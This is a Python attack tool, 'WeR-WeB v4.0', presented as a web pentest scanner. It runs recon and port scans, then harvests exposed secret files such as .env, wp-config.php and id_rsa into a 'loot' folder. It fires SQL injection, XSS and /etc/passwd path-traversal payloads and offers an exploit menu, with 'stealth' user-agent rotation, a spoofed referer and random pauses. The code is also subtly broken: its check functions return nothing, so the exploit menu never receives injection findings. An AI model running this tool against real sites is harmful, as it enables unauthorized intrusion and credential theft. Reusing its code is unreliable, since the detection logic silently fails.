#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WeR-WeB v4.0 — Kali CLI Edition (Stealth Risc Mode)
Author: WER_CC
Description: Advanced Web Pentest Scanner with exploit menu in -risc mode
Note: For legal pentesting only!
"""

import requests
import socket
import random
import time
import sys
import argparse
import os
import re
import whois
import dns.resolver
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from datetime import datetime

# Init colorama
init(autoreset=True)

# Global settings
LOOT_DIR = "loot"
if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

# Random User-Agent list for stealth mode
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "close",
        "Referer": "https://google.com/"
    }

# Loot saving
def save_loot(name, content):
    filename = f"{LOOT_DIR}/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)
    print(Fore.YELLOW + f"[+] Loot saved: {filename}")

# Argument parser
parser = argparse.ArgumentParser(
    description="WeR-WeB v4.0 — Web Pentest Scanner for Kali Linux"
)
parser.add_argument("mode", choices=["-low", "-med", "-risc"], help="Scan mode: -low / -med / -risc")
parser.add_argument("target", help="Target URL (e.g., https://example.com)")
parser.add_argument("--save", action="store_true", help="Save full report to loot/")
parser.add_argument("--no-color", action="store_true", help="Disable colored output")
args = parser.parse_args()

TARGET = args.target.strip()
MODE = args.mode

# Banner (short, no skull)
def banner():
    print(Fore.CYAN + Style.BRIGHT + "============================================================")
    print(Fore.CYAN + Style.BRIGHT + "WeR-WeB v4.0 — Web Recon & Exploit Framework (Kali CLI Edition)")
    print(Fore.CYAN + Style.BRIGHT + "============================================================")
    print(Fore.WHITE + f"Target: {TARGET} | Mode: {MODE}")
    print()

banner()

# ====================== Recon Functions ======================

def host_info(url):
    print(Fore.CYAN + "[i] Gathering host information...")
    findings = []
    try:
        host = urlparse(url).netloc
        ip = socket.gethostbyname(host)
        findings.append(f"IP: {ip}")
        print(Fore.WHITE + f"[i] Server IP: {ip}")
        try:
            w = whois.whois(host)
            registrar = w.registrar if hasattr(w, "registrar") else "Unknown"
            country = w.country if hasattr(w, "country") else "Unknown"
            findings.append(f"Registrar: {registrar}")
            findings.append(f"Country: {country}")
        except:
            print(Fore.RED + "[!] WHOIS lookup failed")
        try:
            for record_type in ["A", "MX", "TXT"]:
                try:
                    answers = dns.resolver.resolve(host, record_type)
                    for r in answers:
                        findings.append(f"{record_type}: {str(r)}")
                except:
                    pass
        except:
            pass
    except Exception as e:
        print(Fore.RED + f"[!] Host info error: {e}")
    if args.save:
        save_loot("host_info", "\n".join(findings))


def port_scan(url, top_ports=20):
    print(Fore.CYAN + "[i] Scanning common ports...")
    findings = []
    host = urlparse(url).netloc
    try:
        ip = socket.gethostbyname(host)
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                        3306, 3389, 8080, 8443, 5900, 53, 111, 993, 995, 587]
        for port in common_ports[:top_ports]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Open port: {port}")
                findings.append(f"Open port: {port}")
            sock.close()
    except Exception as e:
        print(Fore.RED + f"[!] Port scan error: {e}")
    if args.save:
        save_loot("open_ports", "\n".join(findings))


def security_headers(url):
    print(Fore.CYAN + "[i] Checking security headers...")
    findings = []
    required_headers = [
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Referrer-Policy"
    ]
    try:
        r = requests.get(url, headers=get_headers(), timeout=5)
        for h in required_headers:
            if h in r.headers:
                print(Fore.GREEN + f"[+] {h}: Present")
            else:
                print(Fore.RED + f"[!] {h}: MISSING")
                findings.append(f"Missing: {h}")
    except Exception as e:
        print(Fore.RED + f"[!] Header check error: {e}")
    if args.save:
        save_loot("security_headers", "\n".join(findings))


def cms_detect(url):
    print(Fore.CYAN + "[i] Detecting CMS...")
    try:
        r = requests.get(url, headers=get_headers(), timeout=5)
        html = r.text.lower()
        if "wp-content" in html or "wordpress" in html:
            print(Fore.GREEN + "[+] CMS: WordPress detected")
        elif "joomla" in html:
            print(Fore.GREEN + "[+] CMS: Joomla detected")
        elif "drupal" in html:
            print(Fore.GREEN + "[+] CMS: Drupal detected")
        else:
            print(Fore.YELLOW + "[-] CMS not identified")
    except Exception as e:
        print(Fore.RED + f"[!] CMS detection error: {e}")

# ====================== Vulnerability Scans ======================

def check_secret_files(url):
    print(Fore.CYAN + "[i] Checking for sensitive files...")
    sensitive_paths = [
        ".env", "config.php", "wp-config.php", "backup.sql", "db.sql",
        "dump.sql", "database.sql", "config.json", "admin/config.php",
        "credentials.txt", "passwd", "private.key", "id_rsa",
        "composer.json", "backup.zip", "db_backup.zip", "site_backup.tar.gz",
        "settings.py"
    ]
    findings = []
    for path in sensitive_paths:
        full_url = urljoin(url, path)
        try:
            r = requests.get(full_url, headers=get_headers(), timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(Fore.RED + f"[CRITICAL] Sensitive file: {full_url}")
                findings.append(full_url)
                if args.save:
                    save_loot("secret_file", full_url + "\n" + r.text)
            time.sleep(random.uniform(0.5, 1.5))  # stealth pause
        except:
            pass
    if not findings:
        print(Fore.GREEN + "[SAFE] No sensitive files found")


def crawl_links(url, max_links=20):
    print(Fore.CYAN + "[i] Crawling site for links...")
    visited = set()
    links_found = []
    try:
        r = requests.get(url, headers=get_headers(), timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            link = urljoin(url, a["href"])
            if link not in visited and urlparse(link).netloc == urlparse(url).netloc:
                visited.add(link)
                links_found.append(link)
                print(Fore.WHITE + f"[+] Found link: {link}")
                if len(links_found) >= max_links:
                    break
        if args.save and links_found:
            save_loot("links", "\n".join(links_found))
    except Exception as e:
        print(Fore.RED + f"[!] Crawler error: {e}")
    return links_found


def check_sqli(url):
    print(Fore.CYAN + "[i] Testing for SQL Injection...")
    payloads = ["'", "' OR '1'='1", '" OR "1"="1', "1' OR '1'='1' -- "]
    vuln_found = False
    for payload in payloads:
        target_url = f"{url}?id={payload}"
        try:
            r = requests.get(target_url, headers=get_headers(), timeout=5)
            if any(err in r.text.lower() for err in ["sql syntax", "mysql", "pdo", "sql error", "warning: mysql"]):
                print(Fore.RED + f"[CRITICAL] SQLi found: {target_url}")
                vuln_found = True
                if args.save:
                    save_loot("sqli", target_url)
                break
            time.sleep(random.uniform(0.5, 1.5))  # stealth pause
        except:
            pass
    if not vuln_found:
        print(Fore.GREEN + "[SAFE] No SQL Injection found")


def check_xss(url):
    print(Fore.CYAN + "[i] Testing for XSS...")
    payload = "<script>alert('XSS')</script>"
    try:
        target_url = f"{url}?q={payload}"
        r = requests.get(target_url, headers=get_headers(), timeout=5)
        if payload in r.text:
            print(Fore.RED + f"[CRITICAL] XSS found: {target_url}")
            if args.save:
                save_loot("xss", target_url)
        else:
            print(Fore.GREEN + "[SAFE] No XSS found")
    except:
        print(Fore.RED + "[!] XSS test error")


def check_lfi(url):
    print(Fore.CYAN + "[i] Testing for LFI...")
    payloads = [
        "?file=../../../../etc/passwd",
        "?page=../../../../etc/passwd",
        "?inc=../../../../etc/passwd"
    ]
    found = False
    for payload in payloads:
        try:
            target_url = url + payload
            r = requests.get(target_url, headers=get_headers(), timeout=5)
            if "root:x:" in r.text:
                print(Fore.RED + f"[CRITICAL] LFI found: {target_url}")
                found = True
                if args.save:
                    save_loot("lfi", target_url + "\n" + r.text)
                break
            time.sleep(random.uniform(0.5, 1.5))  # stealth pause
        except:
            pass
    if not found:
        print(Fore.GREEN + "[SAFE] No LFI found")

# ====================== Exploit Menu (Risc Mode) ======================

def exploit_menu(vulns):
    if not vulns:
        print(Fore.YELLOW + "[i] No vulnerabilities to exploit.")
        return
    
    print(Fore.MAGENTA + "\n[EXPLOIT MENU]")
    for i, v in enumerate(vulns, 1):
        print(Fore.MAGENTA + f"{i}. {v['type']} — {v['target']}")
    print(Fore.MAGENTA + "0. Exit exploit menu")

    while True:
        try:
            choice = int(input(Fore.CYAN + "\nSelect exploit to run: "))
        except ValueError:
            print(Fore.RED + "[!] Invalid choice")
            continue
        
        if choice == 0:
            break
        elif 1 <= choice <= len(vulns):
            vuln = vulns[choice - 1]
            if vuln["type"] == "SQLi":
                run_sqli_exploit(vuln["target"])
            elif vuln["type"] == "XSS":
                run_xss_exploit(vuln["target"])
            elif vuln["type"] == "LFI":
                run_lfi_exploit(vuln["target"])
            elif vuln["type"] == "Secret File":
                download_file(vuln["target"])
            else:
                print(Fore.RED + "[!] No exploit available for this type")
        else:
            print(Fore.RED + "[!] Invalid choice")


def run_sqli_exploit(url):
    print(Fore.RED + f"[EXPLOIT] Dumping DB from: {url}")
    print(Fore.YELLOW + "[!] Simulated exploit — replace with real SQLmap integration if allowed")
    time.sleep(2)


def run_xss_exploit(url):
    print(Fore.RED + f"[EXPLOIT] Injecting JS payload into: {url}")
    payload = "<script>alert('Owned by WeR-WeB')</script>"
    try:
        requests.get(url, headers=get_headers(), params={"q": payload}, timeout=5)
        print(Fore.GREEN + "[+] Payload sent")
    except:
        print(Fore.RED + "[!] Failed to send payload")


def run_lfi_exploit(url):
    print(Fore.RED + f"[EXPLOIT] Attempting /etc/passwd read from: {url}")
    try:
        r = requests.get(url, headers=get_headers(), timeout=5)
        if "root:x:" in r.text:
            print(Fore.GREEN + "[+] /etc/passwd content:")
            print(r.text)
        else:
            print(Fore.YELLOW + "[-] LFI exploitation failed")
    except:
        print(Fore.RED + "[!] LFI request error")


def download_file(url):
    print(Fore.RED + f"[EXPLOIT] Downloading sensitive file: {url}")
    try:
        r = requests.get(url, headers=get_headers(), timeout=5)
        if r.status_code == 200:
            save_loot("downloaded_file", r.text)
            print(Fore.GREEN + "[+] File saved to loot/")
        else:
            print(Fore.YELLOW + "[-] File not accessible")
    except:
        print(Fore.RED + "[!] File download error")

# ====================== Main Execution ======================

def main():
    found_vulns = []

    if MODE == "-low":
        host_info(TARGET)
        port_scan(TARGET, top_ports=10)
        security_headers(TARGET)
        cms_detect(TARGET)

    elif MODE == "-med":
        host_info(TARGET)
        port_scan(TARGET)
        security_headers(TARGET)
        cms_detect(TARGET)
        check_secret_files(TARGET)
        links = crawl_links(TARGET, max_links=30)
        check_sqli(TARGET)
        check_xss(TARGET)
        check_lfi(TARGET)

    elif MODE == "-risc":
        host_info(TARGET)
        port_scan(TARGET, top_ports=50)
        security_headers(TARGET)
        cms_detect(TARGET)

        # Aggressive + Stealth
        check_secret_files(TARGET)
        links = crawl_links(TARGET, max_links=100)

        # Record vulnerabilities for exploit menu
        for link in links:
            if check_sqli(link):
                found_vulns.append({"type": "SQLi", "target": link})
            if check_xss(link):
                found_vulns.append({"type": "XSS", "target": link})
            if check_lfi(link):
                found_vulns.append({"type": "LFI", "target": link})

        # Secret files as exploits
        sensitive_paths = [
            ".env", "config.php", "wp-config.php", "backup.sql"
        ]
        for path in sensitive_paths:
            full_url = urljoin(TARGET, path)
            try:
                r = requests.get(full_url, headers=get_headers(), timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    found_vulns.append({"type": "Secret File", "target": full_url})
            except:
                pass

        # Exploit menu
        exploit_menu(found_vulns)

    else:
        print(Fore.RED + "[!] Invalid mode")


if __name__ == "__main__":
    main()


